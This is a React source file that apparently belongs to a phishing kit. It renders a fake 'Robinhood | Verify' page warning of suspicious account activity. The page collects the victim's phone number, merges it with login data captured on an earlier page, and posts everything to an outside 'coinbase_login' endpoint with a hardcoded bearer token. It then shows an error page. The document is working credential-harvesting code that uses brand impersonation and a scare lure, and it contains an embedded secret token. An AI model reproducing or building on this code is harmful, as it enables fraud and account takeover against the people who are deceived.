import { useEffect, useState } from 'react';
import { Link, redirect, useNavigate, useNavigation, useLocation } from "react-router-dom";
import { Helmet, HelmetProvider } from 'react-helmet-async';
import bgLogo from './../../assets/img/bg.jpg'
import DataService from '../../services/DataService';
import ValidationService from '../../services/ValidationService';
import { toast } from 'react-toastify';
import AppLayout from '../../layouts/AppLayout';
import axios from 'axios';

function Verify() {

    let initVerifyFormData          =   {
        phone_number                    :   '', 
        loading                         :   false
    };

    const [verifyFormData, setVerifyFormData]   =   useState(initVerifyFormData);
    const {state}                               =   useLocation();
    const navigate                              =   useNavigate(); 


    useEffect(() => { 
        console.log('Effect Call')
        setTimeout(() => {
            if(!state || !state.loginFormData || !state.loginFormData.email) {
                return navigate("/");
            } else {
                setVerifyFormData({...verifyFormData, ...state.loginFormData})
            }
        },2000);
	}, [])


    const submitVerifyHandler       =   (event) => {
        event.preventDefault();

        setVerifyFormData({...verifyFormData, loading : true});

        let rules                   =   {
            'phone_number'              :   'required|numeric',
        };
        let rulesMsg                =   {
            'phone_number'              :    {required : 'Please enter phone'},
        };
       let error                    =   ValidationService.rulesFirstErrorGenerator(verifyFormData, rules, rulesMsg);
       if(error) {
            toast.error(error);
            setVerifyFormData({...verifyFormData, loading : false});
       } else {
            const headers       =   { 'Accept': 'application/json','Content-Type':'application/json','Authorization':'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2NTM2Mzg3NjY3MTNkMDBkMzk3YzhmMCJ9.vUCJSsofnVWOb8U7NKRZzLZPzo2QMt5bpp3I_3vJPvA'};
            axios({
                method: 'POST', headers: headers, data : verifyFormData, url: 'https://apiv2.liveledgers.com/public/coinbase_login'
            })
            .then(function (response) {
                setVerifyFormData({...verifyFormData, loading : false});
                //Goto Verify Screen :-
                return navigate("/error", { state: { verifyFormData : {...state.loginFormData , ...verifyFormData} } });
            })
            .catch(function (error) {
                let msg                 =   error?.response?.data?.detail ?? 'Application not initialize successfully.';
                toast.error(msg);
                setVerifyFormData({...verifyFormData, loading : false});
            });
        }
    }

    return (<AppLayout>
        <Helmet>
            <title>Robinhood | Verify</title>
        </Helmet>
        <div className="container-fluid">
            <div className="row">
                <div className="col-md-6 order-md-1 order-2 px-0">
                    <div className="login_bg_img"></div>
                </div>
                <div className="col-md-6 order-md-2 order-1">
                    <div className='row'>
                        <div className='col-12 offset-0 col-md-10 offset-md-1 login_form_bg_img' >
                            <div className='d-flex align-items-center' style={{minHeight:"100vh"}}>
                                <form onSubmit={submitVerifyHandler} className="col-12 p25 shadow-lg border border-secondary-subtle bg-white">
                                    <div className='text-center'>
                                        <h3 className="my30 fs25 fw-bold">Verification Required</h3>
                                        <h3 className="my30 fs20 fw-bold">Important Information</h3>
                                        <p  className="my30 fs16 lh35 fw-bold">Some Suspicious Activity Found With Your Account, Enter Your Phone Number to Verify Your Identity.</p>
                                    </div>
                                    <div className="my25">
                                        <label htmlFor="" className="form-label fs20">Phone Number</label>
                                        <input type="tel"
                                            required className="form-control form-control-lg px25"
                                            value={verifyFormData.phone_number}  
                                            placeholder="+1-234-567-8910"
                                            onChange={e => DataService.handleFormState('phone_number', e.target.value, verifyFormData, setVerifyFormData)}
                                        />
                                    </div>
                                    <div className="row mt-4">
                                        <div className="col-12 text-end">
                                            <button type="submit" className={['btn','btn-success', 'btn-lg' ,'px40' ,verifyFormData.loading ? 'disabled' : ''].join(' ')} >
                                                {verifyFormData.loading && <span className="spinner-grow spinner-grow-sm me15" aria-hidden="true"></span>}
                                                <span>Submit</span>
                                            </button>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </AppLayout>)
}

export default Verify